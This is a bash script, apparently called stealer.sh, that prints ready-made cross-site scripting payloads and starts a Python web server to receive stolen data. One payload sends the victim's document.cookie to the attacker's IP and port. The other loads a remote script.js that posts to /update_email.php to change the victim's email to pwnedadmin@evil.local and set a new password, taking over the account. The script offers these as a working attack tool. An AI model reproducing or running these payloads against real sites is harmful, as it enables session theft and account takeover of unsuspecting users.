#!/bin/bash

function usage() {
    cat << EOF
Usage: $0 <Attacker_IP> <Attacker_PORT>

Options:
  -h, --help   Show this help message and exit

Description:
  This script creates a simple web server for capturing cookies.

Steps:
  1. Just provide your IP and port
  2. Run the script like: bash stealer.sh IP PORT
EOF
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    usage
    exit 0
fi

if [[ $# -ne 2 ]]; then
    echo "Error: Missing IP address or port."
    usage
    exit 1
fi

IP="$1"
PORT="$2"
BLUE='\033[1;34m'
RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m'
PAYLOAD1="====> 0xmr<script>var i = new Image(); i.src=\"http://$IP:$PORT/?c=\" + document.cookie;</script>"
PAYLOAD2="  Save into the file called  [ script.js ]

fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=pwnedadmin@evil.local&password=pwnadmin'
});


 ====> <script src="http://$IP:$PORT/script.js"></script>"
 
echo -e "${RED}📨 Use this Payloads:${NC}"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
#echo -e "\033[1;41;37m$PAYLOAD1\033[0m"
echo -e "     "
echo -e "${GREEN} $PAYLOAD1 ${NC}"
echo -e "${BLUE} ${NC}"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo -e "  "
echo -e "${GREEN} $PAYLOAD2 ${NC}"
echo -e " ${BLUE} ${NC} "
echo -e " "
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

echo  -e "${RED} [+] Starting WEB SERVER on port $PORT...${NC}"
echo -e "${NC} "
sudo python3 -m http.server $PORT
